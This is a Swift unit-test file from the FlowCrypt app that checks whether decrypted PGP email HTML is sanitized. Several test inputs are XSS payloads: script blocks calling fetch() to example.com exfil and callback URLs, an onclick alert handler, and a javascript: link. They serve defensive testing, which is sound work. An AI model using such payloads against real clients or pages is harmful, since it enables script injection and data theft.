//
//  HTMLSanitizationTests.swift
//
//  Created by Mart on 30/06/2026
//  Copyright © 2017-present FlowCrypt a. s. All rights reserved.
//

@testable import FlowCrypt
import XCTest

class HTMLSanitizationTests: XCTestCase {
    let core: Core = .shared

    override func setUp() async throws {
        try await super.setUp()
        try await core.waitUntilJavaScriptReady(timeout: 10)
    }

    // MARK: - End-to-end: decrypt a PGP-encrypted XSS payload, then verify sanitization

    func testDecryptedXssPayloadIsStrippedAfterFullRoundtrip() async throws {
        let key = TestData.k0
        let attackHtml = """
        <html>
          <body>
            <p>FC_DECRYPTED_PLAINTEXT_JS_POC</p>
            <script>
              fetch('https://example.com/exfil?data=secret')
            </script>
          </body>
        </html>
        """

        let encrypted = try await core.encrypt(
            data: attackHtml.data(),
            pubKeys: [key.public],
            password: nil
        )

        let decrypted = try await core.parseDecryptMsg(
            encrypted: encrypted,
            keys: [key],
            msgPwd: nil,
            isMime: false,
            verificationPubKeys: []
        )

        let sanitized = try await core.sanitizeHtml(html: decrypted.text)

        XCTAssertTrue(
            sanitized.contains("FC_DECRYPTED_PLAINTEXT_JS_POC"),
            "benign content must survive roundtrip"
        )

        XCTAssertFalse(
            sanitized.contains("<script"),
            "script tags must be removed after full decrypt+sanitize pipeline"
        )
        XCTAssertFalse(
            sanitized.contains("fetch("),
            "script body must be removed"
        )
        XCTAssertFalse(
            sanitized.contains("example.com"),
            "example URLs must be removed"
        )
    }

    func testDecryptedEntityEncodedXssIsSanitizedByMessageHelper() async throws {
        let key = TestData.k0
        let encodedHtml = """
        <div>FC_ENTITY_ENCODED_XSS_POC</div>
        &lt;script&gt;
        fetch('https://example.com/entity-xss-callback')
        &lt;/script&gt;
        """
        let encodedPayload = """
        MIME-Version: 1.0
        Content-Type: text/html; charset=UTF-8

        \(encodedHtml)
        """
        let encrypted = try await core.encrypt(
            data: encodedPayload.data(),
            pubKeys: [key.public],
            password: nil
        )
        let decrypted = try await core.parseDecryptMsg(
            encrypted: encrypted,
            keys: [key],
            msgPwd: nil,
            isMime: false,
            verificationPubKeys: []
        )

        XCTAssertTrue(
            decrypted.text.contains("<script>"),
            "Core must reproduce the report's entity-decoding precondition"
        )

        let message = Message(
            identifier: .random,
            date: .now,
            sender: nil,
            subject: nil,
            size: nil,
            labels: [],
            attachmentIds: [],
            body: MessageBody(text: encodedHtml, html: nil, attachment: nil)
        )
        let processedMessage = try await MessageHelper.makeProcessedMessage(
            message: message,
            decrypted: decrypted,
            attachments: [],
            keyDetails: []
        )

        XCTAssertTrue(processedMessage.text.contains("FC_ENTITY_ENCODED_XSS_POC"))
        XCTAssertFalse(processedMessage.text.contains("<script"))
        XCTAssertFalse(processedMessage.text.contains("fetch("))
        XCTAssertFalse(processedMessage.text.contains("example.com"))
        XCTAssertFalse(processedMessage.text.isHTMLString)
        XCTAssertFalse(processedMessage.attributedMessage.string.contains("<script"))
    }

    func testDecryptedHtmlWithoutTagsPassesThrough() async throws {
        let key = TestData.k0
        let plainText = "Hello, this is a normal encrypted message."

        let encrypted = try await core.encrypt(
            data: plainText.data(),
            pubKeys: [key.public],
            password: nil
        )
        let decrypted = try await core.parseDecryptMsg(
            encrypted: encrypted,
            keys: [key],
            msgPwd: nil,
            isMime: false,
            verificationPubKeys: []
        )
        let sanitized = try await core.sanitizeHtml(html: decrypted.text)

        XCTAssertEqual(sanitized, plainText)
    }

    // MARK: - sanitizeHtml unit tests

    func testSanitizeHtmlStripsScriptTags() async throws {
        let input = """
        <html><body><p>Hello</p><script>fetch('https://example.com/exfil')</script></body></html>
        """
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "Hello"))
        XCTAssertNil(sanitized.range(of: "<script"))
        XCTAssertNil(sanitized.range(of: "fetch("))
        XCTAssertNil(sanitized.range(of: "example.com"))
    }

    func testSanitizeHtmlStripsInlineEventHandlers() async throws {
        let input = "<p onclick=\"alert(1)\">Click me</p>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "Click me"))
        XCTAssertNil(sanitized.range(of: "onclick"))
        XCTAssertNil(sanitized.range(of: "alert"))
    }

    func testSanitizeHtmlStripsJavascriptProtocolInLinks() async throws {
        let input = "<a href=\"javascript:alert('xss')\">click</a>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNil(sanitized.range(of: "javascript:"))
    }

    func testSanitizeHtmlPreservesSafePlainText() async throws {
        let input = "This is a plain text message with no HTML."
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertEqual(sanitized, input)
    }

    func testSanitizeHtmlPreservesSafeFormatting() async throws {
        let input = "<b>bold</b> and <i>italic</i>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "bold"))
        XCTAssertNotNil(sanitized.range(of: "italic"))
    }

    func testProcessedMessageDoesNotDecodeEscapedForbiddenMarkup() async throws {
        let input = "<div>Safe content</div>&lt;style&gt;body { display: none; }&lt;/style&gt;"
        let message = Message(
            identifier: .random,
            date: .now,
            sender: nil,
            subject: nil,
            size: nil,
            labels: [],
            attachmentIds: [],
            body: MessageBody(text: "", html: input, attachment: nil)
        )

        let processedMessage = try await ProcessedMessage(message: message)

        XCTAssertTrue(processedMessage.text.contains("<div>Safe content</div>"))
        XCTAssertTrue(processedMessage.text.contains("&lt;style&gt;"))
        XCTAssertFalse(processedMessage.text.contains("<style>"))
    }

    func testSanitizedPlainTextQuoteRemainsHiddenAndDisplaysQuoteMarker() async throws {
        let input = """
        New reply

        On Tue, Alice wrote:
        > quoted line
        > second quoted line
        """
        let sanitized = try await core.sanitizeHtml(html: input)
        let message = Message(
            identifier: .random,
            date: .now,
            sender: nil,
            subject: nil,
            size: nil,
            labels: [],
            attachmentIds: [],
            body: MessageBody(text: input, html: nil, attachment: nil)
        )

        let processedMessage = ProcessedMessage(message: message, text: sanitized, type: .encrypted)

        XCTAssertEqual(processedMessage.text, "New reply")
        XCTAssertEqual(
            processedMessage.quote,
            "On Tue, Alice wrote:\n&gt; quoted line\n&gt; second quoted line"
        )
        XCTAssertEqual(
            processedMessage.attributedQuote?.string,
            "On Tue, Alice wrote:\n> quoted line\n> second quoted line"
        )
    }

    func testSanitizedPlainTextEntitiesDisplayNormallyInNativeText() async throws {
        let input = "Math: 1 < 2 & 3 > 2; &quot;hello&quot; and &#39;bye&#39;"
        let sanitized = try await core.sanitizeHtml(html: input)
        let message = Message(
            identifier: .random,
            date: .now,
            sender: nil,
            subject: nil,
            size: nil,
            labels: [],
            attachmentIds: [],
            body: MessageBody(text: input, html: nil, attachment: nil)
        )

        let processedMessage = ProcessedMessage(message: message, text: sanitized, type: .encrypted)

        XCTAssertEqual(
            processedMessage.text,
            "Math: 1 &lt; 2 &amp; 3 &gt; 2; \"hello\" and 'bye'"
        )
        XCTAssertEqual(
            processedMessage.attributedMessage.string,
            "Math: 1 < 2 & 3 > 2; \"hello\" and 'bye'"
        )
    }

    // MARK: - isHTMLString (decrypted-content routing detection)

    func testIsHtmlStringDetectsMatchingTags() {
        let input = "<div>Hello</div>"
        XCTAssertTrue(input.isHTMLString)
    }

    func testIsHtmlStringDetectsNestedHtml() {
        let input = "<html><body><p>content</p></body></html>"
        XCTAssertTrue(input.isHTMLString)
    }

    func testIsHtmlStringNegativeForPlainText() {
        let input = "Hello, this is a plain message."
        XCTAssertFalse(input.isHTMLString)
    }

    func testIsHtmlStringNegativeForEmailAngleBrackets() {
        let input = "Please contact us at <user@example.com> for support."
        XCTAssertFalse(input.isHTMLString)
    }

    func testIsHtmlStringNegativeForUnmatchedOpeningTag() {
        let input = "Just an opening <div without closing."
        XCTAssertFalse(input.isHTMLString)
    }
}
